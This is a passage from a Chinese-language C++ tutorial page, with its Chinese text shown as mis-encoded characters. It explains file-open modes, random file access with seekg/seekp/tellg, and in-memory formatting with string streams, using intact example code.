(<code>|</code>)</strong> æ¥ç»„åˆå¤šä¸ªæ¨¡å¼æ ‡å¿—ã€‚</p><p><strong><code>open()</code> æ–¹æ³•:</strong></p><p>é™¤äº†æ„é€ å‡½æ•°ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ <code>open()</code> æ–¹æ³•æ‰“å¼€æ–‡ä»¶ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ofstream outFile;</span><br><span class="line">outFile.open(<span class="string">&quot;config.cfg&quot;</span>, ios_base::out | ios_base::trunc); <span class="comment">// æ˜¾å¼æŒ‡å®šè¦†ç›–å†™å…¥</span></span><br><span class="line"></span><br><span class="line">ifstream dataFile;</span><br><span class="line">dataFile.open(<span class="string">&quot;image.bin&quot;</span>, ios_base::in | ios_base::binary); <span class="comment">// ä»¥äºŒè¿›åˆ¶è¯»å–æ¨¡å¼æ‰“å¼€</span></span><br><span class="line"></span><br><span class="line">fstream ioFile;</span><br><span class="line"><span class="comment">// ä»¥è¯»å†™æ¨¡å¼æ‰“å¼€ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºï¼Œä¸æ¸…ç©ºå†…å®¹</span></span><br><span class="line">ioFile.open(<span class="string">&quot;log.dat&quot;</span>, ios_base::in | ios_base::out | ios_base::binary);</span><br></pre></td></tr></table></figure><p><strong>é»˜è®¤æ¨¡å¼:</strong></p><ul><li>  <code>ifstream</code> é»˜è®¤æ¨¡å¼æ˜¯ <code>ios_base::in</code>ã€‚</li><li>  <code>ofstream</code> é»˜è®¤æ¨¡å¼æ˜¯ <code>ios_base::out | ios_base::trunc</code>ã€‚</li><li>  <code>fstream</code> æ²¡æœ‰é»˜è®¤æ¨¡å¼ï¼Œå¿…é¡»æ˜¾å¼æŒ‡å®šã€‚</li></ul><h3 id="17-4-6-éšæœºå­˜å–"><a href="#17-4-6-éšæœºå­˜å–" class="headerlink" title="17.4.6 éšæœºå­˜å–"></a>17.4.6 éšæœºå­˜å–</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ–‡ä»¶æµæ˜¯æŒ‰é¡ºåºè¯»å–æˆ–å†™å…¥çš„ã€‚ä½†æœ‰æ—¶æˆ‘ä»¬éœ€è¦ç›´æ¥è·³è½¬åˆ°æ–‡ä»¶ä¸­çš„ç‰¹å®šä½ç½®è¿›è¡Œè¯»å†™ï¼Œè¿™ç§°ä¸º**éšæœºå­˜å– (Random Access)**ã€‚</p><p>æ–‡ä»¶æµç»´æŠ¤ç€å†…éƒ¨çš„ä½ç½®æŒ‡é’ˆï¼š</p><ul><li>  <strong>è¾“å…¥æŒ‡é’ˆ (Get Pointer):</strong> <code>istream</code> (åŠ <code>ifstream</code>, <code>fstream</code>) ç»´æŠ¤ï¼ŒæŒ‡ç¤ºä¸‹ä¸€æ¬¡è¯»å–æ“ä½œå°†ä»å“ªé‡Œå¼€å§‹ã€‚</li><li>  <strong>è¾“å‡ºæŒ‡é’ˆ (Put Pointer):</strong> <code>ostream</code> (åŠ <code>ofstream</code>, <code>fstream</code>) ç»´æŠ¤ï¼ŒæŒ‡ç¤ºä¸‹ä¸€æ¬¡å†™å…¥æ“ä½œå°†åœ¨å“ªé‡Œè¿›è¡Œã€‚</li></ul><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æ¥æ“ä½œè¿™äº›ä½ç½®æŒ‡é’ˆï¼š</p><ul><li><p>  <strong><code>seekg(offset, direction)</code> (seek get):</strong> ç§»åŠ¨è¾“å…¥æŒ‡é’ˆã€‚</p></li><li><p><strong><code>seekp(offset, direction)</code> (seek put):</strong> ç§»åŠ¨è¾“å‡ºæŒ‡é’ˆã€‚</p><ul><li>  <code>offset</code>: ä¸€ä¸ªæ•´æ•°å€¼ï¼ˆç±»å‹é€šå¸¸æ˜¯ <code>streamoff</code>ï¼‰ï¼Œè¡¨ç¤ºè¦ç§»åŠ¨çš„å­—èŠ‚æ•°ã€‚å¯ä»¥æ˜¯æ­£æ•°ï¼ˆå‘æ–‡ä»¶æœ«å°¾ç§»åŠ¨ï¼‰æˆ–è´Ÿæ•°ï¼ˆå‘æ–‡ä»¶å¼€å¤´ç§»åŠ¨ï¼‰ã€‚</li><li><code>direction</code>: ä¸€ä¸ªæšä¸¾å€¼ï¼ˆç±»å‹ <code>seekdir</code>ï¼Œå®šä¹‰åœ¨ <code>ios_base</code> ä¸­ï¼‰ï¼ŒæŒ‡å®š <code>offset</code> çš„å‚è€ƒç‚¹ï¼š<ul><li>  <code>ios_base::beg</code>: ä»æ–‡ä»¶<strong>å¼€å¤´</strong>è®¡ç®—åç§»é‡ã€‚</li><li>  <code>ios_base::cur</code>: ä»æ–‡ä»¶<strong>å½“å‰</strong>ä½ç½®è®¡ç®—åç§»é‡ã€‚</li><li>  <code>ios_base::end</code>: ä»æ–‡ä»¶<strong>æœ«å°¾</strong>è®¡ç®—åç§»é‡ï¼ˆæ­¤æ—¶ <code>offset</code> é€šå¸¸ä¸ºè´Ÿæ•°æˆ–é›¶ï¼‰ã€‚</li></ul></li></ul></li><li><p>  <strong><code>tellg()</code> (tell get):</strong> è¿”å›è¾“å…¥æŒ‡é’ˆçš„å½“å‰ä½ç½®ï¼ˆç±»å‹é€šå¸¸æ˜¯ <code>streampos</code>ï¼Œå¯ä»¥è½¬æ¢ä¸ºæ•´æ•°ï¼‰ã€‚</p></li><li><p>  <strong><code>tellp()</code> (tell put):</strong> è¿”å›è¾“å‡ºæŒ‡é’ˆçš„å½“å‰ä½ç½®ã€‚</p></li></ul><p><strong>æ³¨æ„:</strong> éšæœºå­˜å–é€šå¸¸åœ¨<strong>äºŒè¿›åˆ¶æ¨¡å¼ (<code>ios_base::binary</code>)</strong> ä¸‹ä½¿ç”¨æ›´å¯é ï¼Œå› ä¸ºæ–‡æœ¬æ¨¡å¼ä¸‹çš„å­—ç¬¦è½¬æ¢å¯èƒ½ä¼šå¹²æ‰°ç²¾ç¡®çš„å­—èŠ‚å®šä½ã€‚</p><p><strong>ç¤ºä¾‹ï¼šéšæœºè®¿é—®æ–‡ä»¶</strong></p><p>å‡è®¾æœ‰ä¸€ä¸ªå­˜å‚¨è®°å½•çš„æ–‡ä»¶ <code>records.dat</code>ï¼Œæ¯æ¡è®°å½•å›ºå®šå¤§å°ä¸º <code>sizeof(Record)</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Record</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">double</span> value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* filename = <span class="string">&quot;records.dat&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> recordSize = <span class="keyword">sizeof</span>(Record);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- å†™å…¥ä¸€äº›è®°å½• ---</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">outFile</span><span class="params">(filename, <span class="built_in">std</span>::ios::out | <span class="built_in">std</span>::ios::binary | <span class="built_in">std</span>::ios::trunc)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!outFile) &#123; <span class="comment">/* error check */</span> <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Record&gt; records = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="string">&quot;Rec A&quot;</span>, <span class="number">10.1</span>&#125;,</span><br><span class="line">        &#123;<span class="number">2</span>, <span class="string">&quot;Rec B&quot;</span>, <span class="number">20.2</span>&#125;,</span><br><span class="line">        &#123;<span class="number">3</span>, <span class="string">&quot;Rec C&quot;</span>, <span class="number">30.3</span>&#125;,</span><br><span class="line">        &#123;<span class="number">4</span>, <span class="string">&quot;Rec D&quot;</span>, <span class="number">40.4</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; rec : records) &#123;</span><br><span class="line">        outFile.write(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(&amp;rec), recordSize);</span><br><span class="line">    &#125;</span><br><span class="line">    outFile.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- éšæœºè¯»å–å’Œä¿®æ”¹è®°å½• ---</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::fstream <span class="title">ioFile</span><span class="params">(filename, <span class="built_in">std</span>::ios::in | <span class="built_in">std</span>::ios::out | <span class="built_in">std</span>::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!ioFile) &#123; <span class="comment">/* error check */</span> <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    Record tempRec;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. è¯»å–ç¬¬ä¸‰æ¡è®°å½• (ç´¢å¼•ä¸º 2)</span></span><br><span class="line">    <span class="keyword">long</span> position = <span class="number">2</span> * recordSize;</span><br><span class="line">    ioFile.seekg(position, <span class="built_in">std</span>::ios::beg); <span class="comment">// å®šä½åˆ°ç¬¬ä¸‰æ¡è®°å½•çš„å¼€å¤´</span></span><br><span class="line">    <span class="keyword">if</span> (ioFile.read(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(&amp;tempRec), recordSize)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read record at index 2: ID=&quot;</span> &lt;&lt; tempRec.id &lt;&lt; <span class="string">&quot;, Name=&quot;</span> &lt;&lt; tempRec.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to read record at index 2.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. ä¿®æ”¹ç¬¬äºŒæ¡è®°å½• (ç´¢å¼•ä¸º 1)</span></span><br><span class="line">    <span class="keyword">if</span> (ioFile.good()) &#123; <span class="comment">// ç¡®ä¿æµçŠ¶æ€è‰¯å¥½</span></span><br><span class="line">        position = <span class="number">1</span> * recordSize;</span><br><span class="line">        ioFile.seekp(position, <span class="built_in">std</span>::ios::beg); <span class="comment">// å®šä½è¾“å‡ºæŒ‡é’ˆåˆ°ç¬¬äºŒæ¡è®°å½•å¼€å¤´</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¯»å–åŸå§‹è®°å½• (å¯é€‰ï¼Œå¦‚æœéœ€è¦åŸºäºåŸå§‹å€¼ä¿®æ”¹)</span></span><br><span class="line">        <span class="comment">// ioFile.seekg(position, std::ios::beg);</span></span><br><span class="line">        <span class="comment">// ioFile.read(reinterpret_cast&lt;char*&gt;(&amp;tempRec), recordSize);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‡†å¤‡æ–°æ•°æ®å¹¶å†™å…¥</span></span><br><span class="line">        Record updatedRec = &#123;<span class="number">2</span>, <span class="string">&quot;Record B Updated&quot;</span>, <span class="number">25.5</span>&#125;;</span><br><span class="line">        ioFile.write(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(&amp;updatedRec), recordSize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ioFile.fail()) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to write updated record at index 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Updated record at index 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è·å–æ–‡ä»¶å¤§å°</span></span><br><span class="line">    ioFile.seekg(<span class="number">0</span>, <span class="built_in">std</span>::ios::end); <span class="comment">// å®šä½åˆ°æ–‡ä»¶æœ«å°¾</span></span><br><span class="line">    <span class="keyword">long</span> fileSize = ioFile.tellg(); <span class="comment">// è·å–å½“å‰ä½ç½® (å³æ–‡ä»¶å¤§å°)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;File size: &quot;</span> &lt;&lt; fileSize &lt;&lt; <span class="string">&quot; bytes.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of records: &quot;</span> &lt;&lt; fileSize / recordSize &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    ioFile.close();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¾‹å­æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ <code>seekg</code> å’Œ <code>seekp</code> å®šä½åˆ°æ–‡ä»¶ä¸­çš„ç‰¹å®šå­—èŠ‚ä½ç½®ï¼Œå¹¶ä½¿ç”¨ <code>read</code> å’Œ <code>write</code> è¿›è¡ŒäºŒè¿›åˆ¶æ•°æ®çš„è¯»å†™ã€‚</p><h2 id="17-5-å†…æ ¸æ ¼å¼åŒ–"><a href="#17-5-å†…æ ¸æ ¼å¼åŒ–" class="headerlink" title="17.5 å†…æ ¸æ ¼å¼åŒ–"></a>17.5 å†…æ ¸æ ¼å¼åŒ–</h2><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬è®¨è®ºçš„ I/O æ“ä½œéƒ½æ˜¯å°†æ•°æ®å‘é€åˆ°å¤–éƒ¨è®¾å¤‡ï¼ˆå¦‚å±å¹• <code>cout</code>ï¼‰æˆ–æ–‡ä»¶ï¼ˆ<code>ofstream</code>ï¼‰ï¼Œæˆ–è€…ä»å¤–éƒ¨è®¾å¤‡ï¼ˆ<code>cin</code>ï¼‰æˆ–æ–‡ä»¶ï¼ˆ<code>ifstream</code>ï¼‰è¯»å–æ•°æ®ã€‚ä½†æœ‰æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›åœ¨<strong>å†…å­˜ä¸­</strong>å¯¹æ•°æ®è¿›è¡Œæ ¼å¼åŒ–ï¼Œå°†å„ç§ç±»å‹çš„æ•°æ®ï¼ˆæ•°å­—ã€å­—ç¬¦ç­‰ï¼‰è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ–è€…åè¿‡æ¥ï¼Œä»ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‰ç‰¹å®šæ ¼å¼è§£æå‡ºå„ç§ç±»å‹çš„æ•°æ®ã€‚</p><p>C++ æ ‡å‡†åº“é€šè¿‡ <code>&lt;sstream&gt;</code> å¤´æ–‡ä»¶æä¾›äº†<strong>å­—ç¬¦ä¸²æµ (String Streams)</strong> ç±»æ¥å®ç°è¿™ç§<strong>å†…æ ¸æ ¼å¼åŒ– (In-memory Formatting)</strong> æˆ– <strong>å†…å­˜ä¸­çš„ I/O</strong>ã€‚</p><p><code>&lt;sstream&gt;</code> å®šä¹‰äº†ä¸‰ä¸ªä¸»è¦çš„ç±»ï¼š</p><ol><li> <strong><code>ostringstream</code> (output string stream):</strong> ç»§æ‰¿è‡ª <code>ostream</code>ã€‚å®ƒå…è®¸ä½ åƒä½¿ç”¨ <code>cout</code> ä¸€æ ·ï¼Œä½¿ç”¨æ’å…¥è¿ç®—ç¬¦ (<code>&lt;&lt;</code>) å’Œå…¶ä»– <code>ostream</code> æ–¹æ³•å°†å„ç§ç±»å‹çš„æ•°æ®<strong>å†™å…¥</strong>åˆ°ä¸€ä¸ªå†…éƒ¨çš„å­—ç¬¦ä¸²ç¼“å†²åŒºä¸­ã€‚ä¹‹åå¯ä»¥è·å–è¿™ä¸ªæ ¼å¼åŒ–å¥½çš„å­—ç¬¦ä¸²ã€‚</li><li> <strong><code>istringstream</code> (input string stream):</strong> ç»§æ‰¿è‡ª <code>istream</code>ã€‚å®ƒå…è®¸ä½ å°†ä¸€ä¸ªå·²æœ‰çš„ <code>std::string</code> æˆ– C é£æ ¼å­—ç¬¦ä¸²ä½œä¸ºæ•°æ®æºï¼Œç„¶ååƒä½¿ç”¨ <code>cin</code> ä¸€æ ·ï¼Œä½¿ç”¨æå–è¿ç®—ç¬¦ (<code>&gt;&gt;</code>) å’Œå…¶ä»– <code>istream</code> æ–¹æ³•ä»ä¸­<strong>è¯»å–</strong>ï¼ˆè§£æï¼‰æ•°æ®ã€‚</li><li> <strong><code>stringstream</code>:</strong> ç»§æ‰¿è‡ª <code>iostream</code>ã€‚å®ƒç»“åˆäº† <code>ostringstream</code> å’Œ <code>istringstream</code> çš„åŠŸèƒ½ï¼Œå…è®¸å¯¹åŒä¸€ä¸ªå†…éƒ¨å­—ç¬¦ä¸²ç¼“å†²åŒºè¿›è¡Œ<strong>è¯»å–å’Œå†™å…¥</strong>æ“ä½œã€‚</li></ol><p>è¿™äº›å­—ç¬¦ä¸²æµç±»çš„è¡Œä¸ºä¸æ–‡ä»¶æµæˆ–æ§åˆ¶å°æµéå¸¸ç›¸ä¼¼ï¼Œå› ä¸ºå®ƒä»¬å…±äº«ç›¸åŒçš„åŸºç±»å’Œæ¥å£ã€‚ä½ å¯ä»¥ä½¿ç”¨åŒæ ·çš„æ ¼å¼åŒ–æ“çºµç¬¦ï¼ˆå¦‚ <code>setw</code>, <code>setprecision</code>, <code>fixed</code>, <code>hex</code> ç­‰ï¼‰æ¥æ§åˆ¶å­—ç¬¦ä¸²æµä¸­çš„æ ¼å¼ã€‚</p><h3 id="ä½¿ç”¨-ostringstream-è¿›è¡Œæ ¼å¼åŒ–è¾“å‡º"><a href="#ä½¿ç”¨-ostringstream-è¿›è¡Œæ ¼å¼åŒ–è¾“å‡º" class="headerlink" title="ä½¿ç”¨ ostringstream è¿›è¡Œæ ¼å¼åŒ–è¾“å‡º"></a>ä½¿ç”¨ <code>ostringstream</code> è¿›è¡Œæ ¼å¼åŒ–è¾“å‡º</h3><p>å½“ä½ éœ€è¦å°†ä¸åŒç±»å‹çš„æ•°æ®ç»„åˆæˆä¸€ä¸ªæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²æ—¶ï¼Œ<code>ostringstream</code> éå¸¸æœ‰ç”¨ã€‚</p><p><strong>æ­¥éª¤:</strong></p><ol><li> åŒ…å«å¤´æ–‡ä»¶ <code>#include &lt;sstream&gt;</code>ã€‚</li><li> åˆ›å»ºä¸€ä¸ª <code>ostringstream</code> å¯¹è±¡ã€‚</li><li> åƒä½¿ç”¨ <code>cout</code> ä¸€æ ·ï¼Œä½¿ç”¨ <code>&lt;&lt;</code> å°†æ•°æ®æ’å…¥åˆ°æµä¸­ã€‚å¯ä»¥ä½¿ç”¨æ ¼å¼åŒ–æ“çºµç¬¦ã€‚</li><li> ä½¿ç”¨ <code>str()</code> æˆå‘˜å‡½æ•°è·å–æµå†…éƒ¨ç¼“å†²åŒºä¸­ç§¯ç´¯çš„ <code>std::string</code> å‰¯æœ¬ã€‚</li></ol><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt; // åŒ…å« sstream å¤´æ–‡ä»¶</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // for setprecision, fixed</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»º ostringstream å¯¹è±¡</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">ostringstream</span> oss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. å‘æµä¸­æ’å…¥æ•°æ®å¹¶æ ¼å¼åŒ–</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> item = <span class="string">&quot;Gadget&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> quantity = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">12.99</span>;</span><br><span class="line">    <span class="keyword">double</span> total = quantity * price;</span><br><span class="line"></span><br><span class="line">    oss &lt;&lt; <span class="string">&quot;Item: &quot;</span> &lt;&lt; item &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// æ’å…¥å­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦</span></span><br><span class="line">    oss &lt;&lt; <span class="string">&quot;Quantity: &quot;</span> &lt;&lt; quantity &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    oss &lt;&lt; <span class="string">&quot;Price: $&quot;</span> &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; price &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// æ ¼å¼åŒ–æµ®ç‚¹æ•°</span></span><br><span class="line">    oss &lt;&lt; <span class="string">&quot;Total: $&quot;</span> &lt;&lt; total; <span class="comment">// æ ¼å¼åŒ–è®¾ç½®æ˜¯ç²˜æ€§çš„</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è·å–æ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> formatted_string = oss.str();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. è¾“å‡ºæˆ–ä½¿ç”¨è¯¥å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Formatted Output String ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; formatted_string &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">/* Output:</span></span><br><span class="line"><span class="comment">       Item: Gadget</span></span><br><span class="line"><span class="comment">       Quantity: 3</span></span><br><span class="line"><span class="comment">       Price: $12.99</span></span><br><span class="line"><span class="comment">       Total: $38.97</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ostringstream å¯¹è±¡å¯ä»¥é‡ç”¨ï¼Œä½†å†…å®¹ä¼šç»§ç»­ç´¯åŠ </span></span><br><span class="line">    <span class="comment">// oss &lt;&lt; &quot;\nAnother line.&quot;;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;\nAfter adding more:\n&quot; &lt;&lt; oss.str() &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœè¦æ¸…ç©ºå¹¶é‡ç”¨ï¼Œå¯ä»¥è°ƒç”¨ str(&quot;&quot;) æˆ–é‡æ–°æ„é€ </span></span><br><span class="line">    oss.str(<span class="string">&quot;&quot;</span>); <span class="comment">// æ¸…ç©ºç¼“å†²åŒº</span></span><br><span class="line">    oss.clear(); <span class="comment">// æ¸…é™¤å¯èƒ½å­˜åœ¨çš„æµçŠ¶æ€ (è™½ç„¶è¿™é‡Œé€šå¸¸ä¸éœ€è¦)</span></span><br><span class="line">    oss &lt;&lt; <span class="string">&quot;New content.&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAfter clearing and adding:\n&quot;</span> &lt;&lt; oss.str() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// Output: New content.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ostringstream</code> å¸¸ç”¨äºéœ€è¦åŠ¨æ€æ„å»ºåŒ…å«æ•°å€¼å’Œå…¶ä»–æ•°æ®çš„æ—¥å¿—æ¶ˆæ¯ã€æ–‡ä»¶åæˆ–æ˜¾ç¤ºæ–‡æœ¬çš„åœºæ™¯ã€‚</p><h3 id="ä½¿ç”¨-istringstream-è¿›è¡Œæ ¼å¼åŒ–è¾“å…¥"><a href="#ä½¿ç”¨-istringstream-è¿›è¡Œæ ¼å¼åŒ–è¾“å…¥" class="headerlink" title="ä½¿ç”¨ istringstream è¿›è¡Œæ ¼å¼åŒ–è¾“å…¥"></a>ä½¿ç”¨ <code>istringstream</code> è¿›è¡Œæ ¼å¼åŒ–è¾“å…¥</h3><p>å½“ä½ æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”æƒ³ä»ä¸­æŒ‰ç‰¹å®šæ ¼å¼æå–æ•°æ®ï¼ˆä¾‹å¦‚ï¼Œè§£æé…ç½®æ–‡ä»¶çš„ä¸€è¡Œæˆ–ç”¨æˆ·è¾“å…¥çš„å¤åˆæ•°æ®ï¼‰æ—¶ï¼Œ<code>istringstream</code> éå¸¸æœ‰ç”¨ã€‚</p><p><strong>æ­¥éª¤:</strong></p><ol><li> åŒ…å«å¤´æ–‡ä»¶ <code>#include &lt;sstream&gt;</code>ã€‚</li><li> å‡†å¤‡å¥½åŒ…å«å¾…è§£ææ•°æ®çš„ <code>std::string</code>ã€‚</li><li> 